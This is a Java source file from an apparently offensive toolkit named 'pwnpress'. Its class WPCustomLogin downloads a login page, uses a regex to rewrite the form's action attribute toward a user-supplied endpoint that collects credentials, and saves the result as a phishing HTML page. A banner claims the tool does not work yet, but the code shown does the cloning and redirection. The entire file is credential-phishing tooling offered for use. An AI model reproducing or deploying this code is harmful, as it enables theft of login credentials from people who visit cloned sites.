package org.pwnpress.phisher;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class WPCustomLogin {
    
    public static void phish() throws IOException {

        System.out.println("\n[!] WARNING:\n"
                + "\nThis tool is under development. I other words, it does not work at all."
                + "\nI am working on it but hey, if you want it to work right now, go code it"
                + "\nyourself and collaborate with the project!\n");

        Scanner scanner = new Scanner(System.in);

        System.out.print("Enter the login URL: ");
        String loginUrl = scanner.nextLine();

        System.out.print("Enter the API endpoint to send credentials: ");
        String apiEndpoint = scanner.nextLine();

        System.out.print("Enter output file name (without extension): ");
        String outputFileName = scanner.nextLine();

        try {
            // Fetch the login page HTML
            String html = fetchHTML(loginUrl);

            // Modify the form action
            String modifiedHtml = modifyFormAction(html, apiEndpoint);

            // Save the modified HTML to a file
            saveToFile(outputFileName + ".html", modifiedHtml);

            System.out.println("Successfully created " + outputFileName + ".html");

        } catch (IOException e) {
            System.out.println("Error: " + e.getMessage());
        }

        scanner.close();
    }

    // Fetch HTML content of the target page
    private static String fetchHTML(String urlString) throws IOException {
        StringBuilder result = new StringBuilder();
        URL url = new URL(urlString);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");

        try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                result.append(line).append("\n");
            }
        }
        return result.toString();
    }

    // Modify the form action to send credentials to the API
    private static String modifyFormAction(String html, String newAction) {
        // Regex to find the form tag
        Pattern formPattern = Pattern.compile("<form[^>]*action=[\"']?([^\"'>]+)[\"']?[^>]*>", Pattern.CASE_INSENSITIVE);
        Matcher matcher = formPattern.matcher(html);

        if (matcher.find()) {
            String originalFormTag = matcher.group();
            String modifiedFormTag = originalFormTag.replaceFirst("action=[\"']?([^\"'>]+)[\"']?", "action=\"" + newAction + "\"");
            return html.replace(originalFormTag, modifiedFormTag);
        }

        return html; // Return unchanged HTML if no form is found
    }

    // Save the modified HTML to a file
    private static void saveToFile(String fileName, String content) throws IOException {
        try (FileWriter writer = new FileWriter(fileName)) {
            writer.write(content);
        }
    }
}